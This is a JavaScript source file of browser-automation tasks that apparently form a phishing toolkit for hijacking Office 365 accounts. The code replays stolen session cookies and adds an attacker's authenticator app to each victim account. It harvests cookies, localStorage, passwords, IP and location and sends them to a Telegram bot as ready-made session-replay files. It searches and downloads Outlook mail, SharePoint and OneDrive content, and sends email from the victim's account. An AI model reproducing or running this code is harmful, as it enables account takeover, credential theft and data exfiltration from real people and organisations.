const necrohelp = require('../../tasks/helpers/necrohelp')
const db = require('../../db/db')
const clusterLib = require('../../puppeteer/cluster')
const fs = require('fs')
const TelegramBot = require('node-telegram-bot-api');

exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) => {
    const token = params.telegramToken;
    const bot = new TelegramBot(token, {polling: false});
    const chatId = params.telegramChatId;

    // Send notification via Telegram bot:
    for(let id of chatId){
        bot.sendMessage(id, `Instrumentation #${taskId} started`);
    }

    // this is constant
    const nextButtonSelector = "div.ms-Dialog-actionsRight > span:nth-child(2) > button"

    await db.UpdateTaskStatus(taskId, "running")

    await page.setCookie(...cookies);
    await page.goto(params.fixSession);
    //await necrohelp.ScreenshotCurrentPage(page, taskId)
    await necrohelp.Sleep(5000)

    // Get "+ Add Sign-in method" and click on it
    const assSignIn = await page.waitForSelector('i[data-icon-name="Add"]');
    if(assSignIn !== null){
        await assSignIn.click()
    }

    await necrohelp.Sleep(3000)

    //check for modal dialog open and get DropDown Menu, clicking on it
    const modalDiag = await page.waitForSelector('div.ms-Dropdown-container')
    if(modalDiag !== null){
        await modalDiag.click()
    }
    await necrohelp.Sleep(1000)

    //Select the first dropdown option, Authenticator App
    await page.click('div.ms-Callout-main > div > div > button').catch(console.error)
    await necrohelp.Sleep(1000)

    // click on Add
    await page.click(nextButtonSelector).catch(console.error)
    await necrohelp.Sleep(1000)

    // Click on "I want to use a different authenticator app"
    await page.click('div.ms-Dialog-content > div > div:nth-child(1) > div > div > button').catch(console.error)
    await necrohelp.Sleep(1000)

    // click on Next
    await page.click(nextButtonSelector).catch(console.error)
    await necrohelp.Sleep(3000)

    // click on "Can't Scan Image"
    await page.click('div.ms-Dialog-content > div > div > div > div > div:nth-child(4) > button').catch(console.error)
    await necrohelp.Sleep(1000)

    const accountName = await page.evaluate('document.querySelector("div.ms-Dialog-content > div > div > div > div > div:nth-child(6) > span").innerText');
    const secretKey = await page.evaluate('document.querySelector("div.ms-Dialog-content > div > div > div > div > div:nth-child(7) > span").innerText');

    const msg_notification = `[${taskId}] New Authenticator App accountName: ${accountName} with secretKey: ${secretKey}`;
    console.log(msg_notification)

    // click on Next
    await page.click(nextButtonSelector).catch(console.error)
    await necrohelp.Sleep(2000)

    // get the OTP from the secretKey using totp-generator
    const totp = await necrohelp.Totp(secretKey)
    console.log(`[${taskId}] Generated OTP from secretKey ${secretKey}: ${totp}`)

    // type the OTP in the input field
    const input = 'div.ms-Dialog-content > div > div > div > div:nth-child(2) > div:nth-child(3) > div > div > input';
    await page.type(input, totp, {delay: 300}).catch(console.error)

    await necrohelp.Sleep(2000)

    // click on Next
    await page.click(nextButtonSelector).catch(console.error)
    await necrohelp.Sleep(5000)

    await db.UpdateTaskStatus(taskId, "completed")


    // Send notification via Telegram bot:
    for(let id of chatId){
        bot.sendMessage(id, msg_notification);
    }
}

exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
    await db.UpdateTaskStatus(taskId, "running")

    // 1. Inject muraena cookies — let MSAL complete silently on fixSession
    await page.setCookie(...cookies)
    try {
        await page.goto(params.fixSession, { waitUntil: 'networkidle2', timeout: 35000 })
    } catch(e) {
        console.log(`[${taskId}] fixSession: ${e.message}`)
    }
    await necrohelp.Sleep(3000)

    // 2. Collect cookies from all MS domains
    const MS_DOMAINS = [
        'https://login.microsoftonline.com', 'https://login.live.com',
        'https://outlook.office.com', 'https://outlook.office365.com',
        'https://outlook.cloud.microsoft', 'https://www.office.com',
        'https://m365.cloud.microsoft', 'https://substrate.office.com',
    ]
    let allCookies = []
    try {
        allCookies = await page.cookies(...MS_DOMAINS)
    } catch(e) { allCookies = await page.cookies() }
    console.log(`[${taskId}] collected ${allCookies.length} cookies`)

    // 3. Extract localStorage via SEPARATE pages — main page never navigates away.
    //    All pages in the same browser context share localStorage per-origin.
    const LS_ORIGINS = [
        'https://login.microsoftonline.com',
        'https://www.office.com',
        'https://m365.cloud.microsoft',
        'https://outlook.office.com',
        'https://outlook.cloud.microsoft',
    ]
    const originStorages = []
    const browser = page.browser()
    for (const origin of LS_ORIGINS) {
        let lsPage = null
        try {
            lsPage = await browser.newPage()
            await lsPage.goto(origin, { waitUntil: 'domcontentloaded', timeout: 12000 })
            const items = await lsPage.evaluate(() => {
                const d = {}
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i)
                    d[k] = localStorage.getItem(k)
                }
                return d
            })
            const entries = Object.entries(items).map(([name, value]) => ({ name, value }))
            if (entries.length > 0) {
                originStorages.push({ origin, localStorage: entries })
                console.log(`[${taskId}] localStorage ${origin}: ${entries.length} items`)
            }
        } catch(e) {
            console.log(`[${taskId}] localStorage ${origin}: ${e.message}`)
        } finally {
            if (lsPage) try { await lsPage.close() } catch(e) {}
        }
    }
    console.log(`[${taskId}] localStorage origins: ${originStorages.length}`)

    // 4. Victim details from Redis
    let victimEmail = null, victimPass = null, victimIP = null, victimUA = null, victimUUID = null
    try {
        const { createClient: _rc1 } = require('redis')
        const rc1 = _rc1({ url: process.env.REDIS_URL || (process.env.REDIS_PASSWORD ? 'redis://:***@redis:6379' : 'redis://redis:6379') })
        await rc1.connect()
        try {
            victimUUID = await rc1.hGet(taskId, 'name')
            if (victimUUID) {
                const vh = await rc1.hGetAll(`victim:${victimUUID}`)
                victimIP = vh.ip || null
                victimUA = vh.ua || null
                const credKeys = await rc1.keys(`victim:${victimUUID}:creds:*`)
                for (const k of credKeys) {
                    const cred = await rc1.hGetAll(k)
                    const kl = (cred.key || '').toLowerCase()
                    if (!victimEmail && ['loginfmt','username','email','login'].includes(kl)) victimEmail = cred.val
                    if (!victimPass && ['passwd','password'].includes(kl)) victimPass = cred.val
                    if (victimEmail && victimPass) break
                }
            }
        } finally { await rc1.quit() }
    } catch(e) { console.log(`[${taskId}] Redis: ${e.message}`) }

    const label = victimEmail || taskId
    let finalUrl = 'unknown'; try { finalUrl = page.url() } catch(e) {}
    console.log(`[${taskId}] label=${label} pass=${victimPass?'***':'none'} ip=${victimIP} finalUrl=${finalUrl.substring(0,60)}`)

    // 5. GeoIP
    let geoCity = 'Unknown', geoCountry = ''
    if (victimIP) {
        try {
            const geo = await new Promise((res, rej) => {
                require('http').get(`http://ip-api.com/json/${victimIP}?fields=city,country`, r => {
                    let d = ''; r.on('data', c => d += c); r.on('end', () => res(JSON.parse(d)))
                }).on('error', rej)
            })
            geoCity = geo.city || 'Unknown'; geoCountry = geo.country || ''
        } catch(e) {}
    }
    const location = [geoCity, geoCountry].filter(Boolean).join(' - ')
    const ua = victimUA || ''
    const browserName = ua.includes('Edg/') ? 'Edge' : ua.includes('Chrome/') ? 'Chrome'
        : ua.includes('Firefox/') ? 'Firefox' : ua.includes('Safari/') ? 'Safari' : 'Unknown'
    const personalDomains = ['gmail.com','yahoo.com','hotmail.com','outlook.com','live.com','icloud.com','aol.com']
    const accType = personalDomains.includes(((victimEmail||'').split('@')[1]||'').toLowerCase()) ? 'personal' : 'business'
    const dateStr = new Date().toLocaleString('en-US',{weekday:'short',year:'numeric',month:'short',day:'2-digit',hour:'2-digit',minute:'2-digit'})

    if (params.telegramToken && params.telegramChatId) {
        // 6. Dedup
        let alreadySent = false
        if (victimEmail) {
            try {
                const { createClient: _rc2 } = require('redis')
                const rc2 = _rc2({ url: process.env.REDIS_URL || (process.env.REDIS_PASSWORD ? 'redis://:***@redis:6379' : 'redis://redis:6379') })
                await rc2.connect()
                const nx = await rc2.set(`victim:necro_sent:${victimEmail}`, '1', { NX: true, EX: 86400 })
                alreadySent = (nx === null)
                await rc2.quit()
                if (alreadySent) console.log(`[${taskId}] dedup: already sent for ${victimEmail}`)
            } catch(e) { console.log(`[${taskId}] dedup: ${e.message}`) }
        }

        if (!alreadySent) {
            try {
                const TelegramBot = require('node-telegram-bot-api')
                const bot = new TelegramBot(params.telegramToken, { polling: false })
                const chatIds = Array.isArray(params.telegramChatId) ? params.telegramChatId : [params.telegramChatId]
                const safeLabel = label.replace(/[@.]/g,'_').replace(/[^a-zA-Z0-9_]/g,'')

                // ── Build Playwright storageState .py ──
                const cookieArr = allCookies.map(c => ({
                    Name: c.name, Value: c.value, Domain: c.domain,
                    Path: c.path||'/', Secure: c.secure||false,
                    HttpOnly: c.httpOnly||false, SameSite: c.sameSite||'None', Expires: c.expires||0
                }))
                const storageState = { cookies: cookieArr, origins: originStorages }
                const b64 = Buffer.from(JSON.stringify(storageState)).toString('base64')

                const pyScript = [
                    '#!/usr/bin/env python3',
                    '# KRATOS OFFICE365 — ' + label,
                    '# pip install playwright && playwright install chromium',
                    '# python3 ' + safeLabel + '.py',
                    'import asyncio, json, base64',
                    'from playwright.async_api import async_playwright',
                    '',
                    'STATE_B64 = "' + b64 + '"',
                    '',
                    'async def main():',
                    '    state = json.loads(base64.b64decode(STATE_B64).decode("utf-8"))',
                    '    for c in state["cookies"]:',
                    '        c["name"]     = c.pop("Name")',
                    '        c["value"]    = c.pop("Value")',
                    '        c["domain"]   = c.pop("Domain")',
                    '        c["path"]     = c.pop("Path", "/")',
                    '        c["secure"]   = c.pop("Secure", False)',
                    '        c["httpOnly"] = c.pop("HttpOnly", False)',
                    '        ss = c.pop("SameSite", "None")',
                    '        c["sameSite"] = ss.capitalize() if ss else "None"',
                    '        exp = c.pop("Expires", 0)',
                    '        if exp and exp > 0: c["expires"] = float(exp)',
                    '    async with async_playwright() as p:',
                    '        browser = await p.chromium.launch(headless=False)',
                    '        context = await browser.new_context(storage_state=state)',
                    '        page = await context.new_page()',
                    '        await page.goto("https://outlook.office.com/mail/", wait_until="domcontentloaded")',
                    '        await page.wait_for_timeout(5000)',
                    '        print("URL:", page.url)',
                    '        input("Press Enter to close...")',
                    '        await browser.close()',
                    '',
                    'asyncio.run(main())'
                ].join('\n')

                // ── Build Cookie-Editor JSON ──
                // SameSite mapping: Puppeteer 'none' -> Cookie-Editor 'no_restriction'
                const sameSiteMap = { none: 'no_restriction', lax: 'lax', strict: 'strict' }
                const cookieEditorArr = allCookies.map(c => ({
                    name:           c.name,
                    value:          c.value,
                    domain:         c.domain,
                    path:           c.path || '/',
                    secure:         c.secure || false,
                    httpOnly:       c.httpOnly || false,
                    sameSite:       sameSiteMap[(c.sameSite||'none').toLowerCase()] || 'no_restriction',
                    expirationDate: (c.expires && c.expires > 0) ? c.expires : undefined,
                    session:        !(c.expires && c.expires > 0),
                    hostOnly:       !c.domain.startsWith('.'),
                    storeId:        '0'
                }))
                const jsonFile = JSON.stringify(cookieEditorArr, null, 2)

                // ── Info message ──
                const infoMsg = [
                    `[Kratos]- OFFICE VALID [ ${label} ] ❤️`,
                    `⚡ Email: ${label}`,
                    `⚡ Password: ${victimPass || 'N/A'}`,
                    `⚡ Type: ${accType}`,
                    `⚡ 2FA Security: Completed ✅`,
                    `⚡ Role: No`,
                    `⚡ Edu: No`,
                    `——[IP INFORMATION]——`,
                    `IP: ${victimIP || 'Unknown'}`,
                    `Browser: ${browserName}`,
                    `Location: ${location}`,
                    `Date: ${dateStr}`,
                    `GOD-OF-WAR!`,
                    ``,
                    `📦 ${safeLabel}.py  → Playwright (pip install playwright)`,
                    `🍪 ${safeLabel}.json → Cookie-Editor extension (no Python needed)`
                ].join('\n')

                // sendMediaGroup: one message, two document attachments, caption on first
                // Built with Node built-ins only — no form-data dependency
                const sendMediaGroup = (token, chatId, caption, pyBuf, pyName, jsonBuf, jsonName) => {
                    return new Promise((res, rej) => {
                        const https = require('https')
                        const boundary = '----TGBoundary' + Math.random().toString(36).slice(2)
                        const CRLF = '\r\n'
                        const enc = s => Buffer.from(s)
                        const parts = []
                        const mediaJson = JSON.stringify([
                            { type: 'document', media: 'attach://pyfile', caption },
                            { type: 'document', media: 'attach://jsonfile' }
                        ])
                        const fields = [
                            ['chat_id', String(chatId), 'text/plain'],
                            ['media',   mediaJson,      'text/plain'],
                        ]
                        for (const [name, val] of fields) {
                            parts.push(enc(`--${boundary}${CRLF}Content-Disposition: form-data; name="${name}"${CRLF}${CRLF}${val}${CRLF}`))
                        }
                        parts.push(enc(`--${boundary}${CRLF}Content-Disposition: form-data; name="pyfile"; filename="${pyName}"${CRLF}Content-Type: text/x-python${CRLF}${CRLF}`))
                        parts.push(pyBuf)
                        parts.push(enc(CRLF))
                        parts.push(enc(`--${boundary}${CRLF}Content-Disposition: form-data; name="jsonfile"; filename="${jsonName}"${CRLF}Content-Type: application/json${CRLF}${CRLF}`))
                        parts.push(jsonBuf)
                        parts.push(enc(`${CRLF}--${boundary}--${CRLF}`))
                        const body = Buffer.concat(parts)
                        const req = https.request({
                            hostname: 'api.telegram.org',
                            path: `/bot${token}/sendMediaGroup`,
                            method: 'POST',
                            headers: {
                                'Content-Type': `multipart/form-data; boundary=${boundary}`,
                                'Content-Length': body.length
                            }
                        }, r => { let d = ''; r.on('data', c => d += c); r.on('end', () => res(JSON.parse(d))) })
                        req.on('error', rej)
                        req.write(body)
                        req.end()
                    })
                }

                for (const chatId of chatIds) {
                    const result = await sendMediaGroup(
                        params.telegramToken, chatId, infoMsg,
                        Buffer.from(pyScript),  `${safeLabel}.py`,
                        Buffer.from(jsonFile),  `${safeLabel}.json`
                    )
                    if (!result.ok) console.log(`[${taskId}] sendMediaGroup error: ${JSON.stringify(result)}`)
                    console.log(`[${taskId}] delivered to ${chatId}: single message + .py + .json (${allCookies.length} cookies, ${originStorages.length} ls origins)`)
                }
            } catch(e) { console.log(`[${taskId}] Telegram error: ${e.message}`) }
        }
    }

    await necrohelp.ScreenshotCurrentPage(page, taskId)
    await db.UpdateTaskStatus(taskId, "completed")
}

exports.SharepointExtrude = async ({ page, data: [taskId, cookies, params] }) => {
    await page.setCookie(...cookies);

    await page.goto(params.fixSession);
    await necrohelp.Sleep(2000)

    // check if we are logged in and the cookies set are all fine
    const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
    const waffle = await page.evaluate(loggedInSelector);
    console.log(`[${taskId}] session is invoked correctly. Apps waffle found: ${waffle}`)

    // waffle click
    await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
    console.log(`[${taskId}] clicking on o365 Apps waffle`)
    await necrohelp.Sleep(2000)

    // click on sharepoint
    await page.click('#O365_AppTile_Sites > .o365sx-neutral-dark-font > span').catch(console.error)
    console.log(`[${taskId}] loading microsoft Sharepoint`)
    await necrohelp.Sleep(2000)

   // loop for keywords and open N tabs
    let urlsMatchingKeys = [];
    for(let keyword of params.keywords){

      // TODO make this configurable ofc!
      let url = `https://penitenziagite.sharepoint.com/_layouts/15/sharepoint.aspx?q=${keyword}&v=search`
      await page.goto(url)
      await necrohelp.Sleep(4000)

        // get all links matching the search
        // TODO handle pagination if present
      let links = await page.$$('ol[data-searchpanelcontenttype="body"] > li > div > article > div > div > header > h3').catch(console.error)
        console.log(`[${taskId}] searching Sharepoint for ${keyword}. found items: ${links.length}`)

        for(let link of links){
          let href = await link.$eval('a', element => element.getAttribute('href')).catch(console.error)
          console.log(`[${taskId}]    matching item link: ${href}`)
          urlsMatchingKeys.push(href);
      }
    }

    // fetch all the discovered items
    console.log(`[${taskId}]  Found a total of ${urlsMatchingKeys.length} items matching provided keywords. Now fetching...`)
    for(let url of urlsMatchingKeys){
        await page.goto(url)
        await necrohelp.Sleep(2000)

        if(url.includes('/Doc.aspx?')){
            // Office document (word, excel..). we instrument the Save As to download the document as file
            await necrohelp.Sleep(2000)

            console.log(`[${taskId}] exporting office file...`)

            // gets the fullpage Iframe contents
            const elementHandle = await page.$('#WebApplicationFrame').catch(console.error)
            const appIframe = await elementHandle.contentFrame()
            console.log(`[${taskId}]    elementHandle: ${elementHandle}`)
            console.log(`[${taskId}]    appIframe: ${appIframe}`)

            // we work on the iframe DOM not the outer page..~!
            const main = await appIframe.$('#MainApp').catch(console.error)
            console.log(`[${taskId}]    MainApp: ${main}`)

            const inner = await main.$('#applicationOuterContainer > form').catch(console.error)
            console.log(`[${taskId}]    inner: ${inner}`)

            // TODO continue the nested selection and click on File -> Save As..
            await necrohelp.Sleep(2000)

           // await main.click('#TabListContainer > div > button').catch(console.error)

        }

        await necrohelp.ScreenshotCurrentPage(page, taskId)

    }

    await db.UpdateTaskStatus(taskId, "completed")

}

exports.OneDriveExtrude = async ({ page, data: [taskId, cookies, params] }) => {
    await page.setCookie(...cookies);

    await page.goto(params.fixSession);
    //await necrohelp.ScreenshotCurrentPage(page, taskId)
    await necrohelp.Sleep(2000)

    // check if we are logged in and the cookies set are all fine
    const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
    const waffle = await page.evaluate(loggedInSelector);
    console.log(`[${taskId}] session is invoked correctly. Apps waffle found: ${waffle}`)

    // waffle click
    await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
    console.log(`[${taskId}] clicking on o365 Apps waffle`)
    await necrohelp.Sleep(2000)

    // click on onedrive
    await page.click('#O365_AppTile_Documents').catch(console.error)
    console.log(`[${taskId}] loading microsoft OneDrive`)
    await necrohelp.Sleep(2000)
    await necrohelp.ScreenshotCurrentPage(page, taskId)

    // allow downloads
    await page._client.send('Page.setDownloadBehavior', {behavior: 'allow', downloadPath: './extruded'}).catch(console.error)

    // click on select all in the MyFiles view, and download a ZIP with personal files
    await page.click('div.ms-FocusZone > div > div.ms-DetailsHeader-checkTooltip').catch(console.error)

    await page.waitForSelector('button[name="Download"]');
    // click on select all in the MyFiles view
    await page.click('button[name="Download"]').catch(console.error)

    // allow enough time for the async download to complete
    await necrohelp.Sleep(5000)

    // check how many Shared Libraries we have, and click on each of them downloading files
    let sharedLibs = await page.$$('nav.ms-Nav > div:nth-child(2) > div.ms-Nav-groupContent > ul.ms-Nav-navItems > li').catch(console.error)
    let libsCount = sharedLibs.length - 1 // the last item is Create Shared Library which is a links, so to ignore
    console.log(`[${taskId}] searching OneDrive for additional item libraries. found libs: ${libsCount}`)

    let counter = 0
    while(counter < libsCount){
        let selector = `nav.ms-Nav > div:nth-child(2) > div.ms-Nav-groupContent > ul.ms-Nav-navItems > li:nth-child(${counter+1}) > div > a`
        await page.click(selector).catch(console.error)
        await necrohelp.Sleep(3000)
        await necrohelp.ScreenshotCurrentPage(page, taskId)

        // get library title
        let tt = await page.$('ul.BreadcrumbBar-list > li:nth-child(1)').catch(console.error)
        let title = await tt.$eval('a', element => element.getAttribute('title')).catch(console.error)

        // click on select all in the current library view, and download a ZIP with personal files
        await page.click('div.ms-DetailsList-headerWrapper > div > div').catch(console.error)

        // TODO rewrite SEL in a better wait to wait and return null if element is not found, without displaying the error
        let sel = await page.waitForSelector('button[name="Download"]', { timeout: 2000 }).catch(console.error)
        if(typeof sel !== 'undefined'){
            console.log(`[${taskId}] downloading library "${title}" ...`)
            // click on select all in the MyFiles view
            await page.click('button[name="Download"]').catch(console.error)
            await necrohelp.Sleep(3000)
        }else{
            console.log(`[${taskId}] library "${title}" seems empty, skipping it...`)
        }
        counter++
    }

    await db.UpdateTaskStatus(taskId, "completed")
}

exports.OutlookWriteEmail = async ({ page, data: [taskId, cookies, params] }) => {
    await page.setCookie(...cookies);

    await page.goto(params.fixSession);
    // increase zoom for debugging purposes when running in gui mode
    await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)

    // TODO just for demo purposes wait longer
    await necrohelp.Sleep(2000)

    // check if we are logged in and the cookies set are all fine
    const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
    const waffle = await page.evaluate(loggedInSelector);
    if ((typeof waffle !== 'undefined' && waffle !== null) && params.writeEmail !== 'undefined'){
        console.log(`[${taskId}] session is invoked correctly. app waffle: ${waffle}`)
    }else{
        await db.UpdateTaskStatusWithReason(taskId, "error", "session seems NOT authenticated")
        return
    }

    let emailImp = params.writeEmail;

    await page.click('#app > div > div:nth-child(3) > div > div > div > div > div:nth-child(2) > button').catch(console.error)
    await necrohelp.Sleep(3000)

    let toSelector = 'div[aria-label="Reading Pane"] > div > div > div> div > div> div> div > div > div > div> div> div > div > div > div > div > input'
    let subjectSelector = 'div[aria-label="Reading Pane"] > div > div > div> div > div> div> div:nth-child(2) > div >div > div > div > input'
    let contentSelector = 'div[aria-label="Reading Pane"] > div > div > div> div > div > div:nth-child(2) > div'
    let sendSelector = 'div[aria-label="Reading Pane"] > div > div > div> div > div > div:nth-child(3) > div:nth-child(2) > div > div > span > button'

    console.log(`[${taskId}] invoking new email:\n  to[${emailImp.to}]\n  subj[${emailImp.subject}]`)

    await page.type(toSelector, emailImp.to)
    await necrohelp.Sleep(3000)

    await page.click(subjectSelector).catch(console.error)
    await page.type(subjectSelector, emailImp.subject, {delay: 50})
    await necrohelp.Sleep(3000)

    await page.click(contentSelector).catch(console.error)
    await page.type(contentSelector, emailImp.data, {delay: 50})
    await necrohelp.Sleep(3000)

    // NOTE clicking on the UI in this case is not needed
    //
    // await page.click('i[data-icon-name="Attach"]').catch(console.error)
    // await necrohelp.Sleep(1000)
    // await page.click('.ms-ContextualMenu-Callout > div > div > div > ul > li > button').catch(console.error)
    // await necrohelp.Sleep(1000)

    // TODO handle the attachment position in the HTML content. by default the attachment is added at the start of the email
    // TODO maybe we should just click at the end of the email content before adding the attachment?
    // TODO file upload works great but the div position for the send selector changes so needs to be updated otherwise email send fails
    // if (typeof emailImp.attachment !== 'undefined' && emailImp.attachment !== null){
    //     console.log(`[${taskId}] attaching file ${emailImp.attachment}`)
    //     await page.waitForSelector('input[type=file]');
    //     const fileInput = await page.$('input[type=file]');
    //     await fileInput.uploadFile(emailImp.attachment);
    //     await fileInput.evaluate(upload => upload.dispatchEvent(new Event('change', { bubbles: true })));
    //
    //     // give enough time for file upload if N megabytes fat dropper
    //     await necrohelp.Sleep(5000)
    // }

    // click the send button
    await necrohelp.Sleep(5000)

    await page.click(sendSelector).catch(console.error)
    await necrohelp.Sleep(5000)

    console.log(`[${taskId}] email invoked successfully`)

    // TODO handle the fucking attachment reminder as an extra click if shown - if the pretext
    // has attachment or similar words then you are prompted to add one if not present..lulz
    await db.UpdateTaskStatus(taskId, "completed")

}

exports.OutlookExtrude = async ({ page, data: [taskId, cookies, params] }) => {
    // Validate required params early so the error is actionable
    if (!params || !params.fixSession) {
        await db.UpdateTaskStatusWithReason(taskId, "error", "missing required param: fixSession (e.g. https://outlook.office365.com/mail/)")
        return
    }
    if (!params.keywords || !Array.isArray(params.keywords) || params.keywords.length === 0) {
        await db.UpdateTaskStatusWithReason(taskId, "error", "missing required param: keywords (array of search terms, e.g. [\"password\",\"credentials\"])")
        return
    }
    // Office365 session hijacking requires ~37 authenticated cookies. Pre-auth OIDC
    // correlation/nonce cookies (.AspNetCore.OpenIdConnect.Nonce.*, .AspNetCore.Correlation.*)
    // will NOT work — capture cookies AFTER successful authentication.
    if (!cookies || cookies.length < 5) {
        await db.UpdateTaskStatusWithReason(taskId, "error", `insufficient cookies: got ${cookies ? cookies.length : 0}, need ~37 authenticated session cookies (ESTSAUTHPERSISTENT, ESTSAUTH, etc.)`)
        return
    }

    await db.UpdateTaskStatus(taskId, "running")
    await page.setCookie(...cookies);
    await page.goto(params.fixSession);

    // increase zoom for debugging purposes when running in gui mode
    await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)

    await necrohelp.Sleep(2000)

    // check if we are logged in and the cookies set are all fine
    const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
    const waffle = await page.evaluate(loggedInSelector);

    if (typeof waffle !== 'undefined' && waffle !== null){
        console.log(`[${taskId}] session is invoked correctly. app waffle: ${waffle}`)
    }else{
        await db.UpdateTaskStatusWithReason(taskId, "error", "session seems NOT authenticated")
        return
    }

    await necrohelp.Sleep(1000)

    let keywords = params.keywords;

    // loop for each keyword we want to search for
    for(let keyword of keywords){

        console.log(`[${taskId}] searching INBOX emails matching "${keyword}"`)
        // click on the search bar, types the keyword, the press enter
        // TODO sometimes this click throws an error...understand why (not blocking though)
        //await page.click('#searchBoxId-Mail input[aria-label="Search"]').catch(console.error)
        await page.type('#searchBoxId-Mail input[aria-label="Search"]', keyword).catch(console.error)
        await necrohelp.Sleep(1000)
        await page.keyboard.press('Enter');
        await necrohelp.Sleep(3000)

        let selector = "div.threeColumnCirclePersonaDivWidth + div";

        let matches = 0 ;
        while (true){
            // The email results are all DIVs next to div.threeColumnCirclePersonaDivWidth (TopResults) so we can just loop adding "+ div"
            // at each iteration until the element length is shorter or null , then stop
            let email = await page.$(selector);
            if (typeof email !== 'undefined' && email !== null){

                // wait at least 2 seconds to give enough time to fat emails to load. Office is not blazing fast
                await page.click(selector).catch(console.error)
                await necrohelp.Sleep(1000)

                let subject = await page.evaluate("document.querySelector(\"div[aria-label='Content pane'] > div span\").textContent").catch(console.error);
                let emailParts = await page.$$('div.wide-content-host div.allowTextSelection').catch(console.error);

                console.log(`[${taskId}]  ${keyword} -> found email w subject "${subject}"`)

                for(let part of emailParts){
                    let html =  await part.$eval('div', (element) => { return element.innerHTML }).catch(console.error);
                    //console.log("HTML DEBUG:\n" + html)
                    let email = { subject: subject, html: html }
                    let emailJson = JSON.stringify(email, null, 4);
                    let emailBlob = await Buffer.from(emailJson).toString('base64');

                    await fs.writeFile(`${clusterLib.GetConfig().platform.extrusionPath}/email_${taskId}_${Date.now()}.html`, html, function(err) {
                        if(err){console.log("error savig email to file: " + err)}
                    });
                    let key = `email_${keyword}_${matches}`
                    await db.AddExtrudedData(taskId, key, emailBlob)
                }

                // update selector to go for next div
                selector += " + div"
                matches += 1
            }else{
                break
            }
        }

        console.log(`[${taskId}] extruded ${matches} emails matching "${keyword}"`)

        // clean the input search field
        const cleanInput = "document.querySelector(\"#searchBoxId-Mail input[aria-label='Search']\").value = \"\"";
        await page.evaluate(cleanInput);
        await necrohelp.Sleep(2000)
    }

    await db.UpdateTaskStatus(taskId, "completed")
}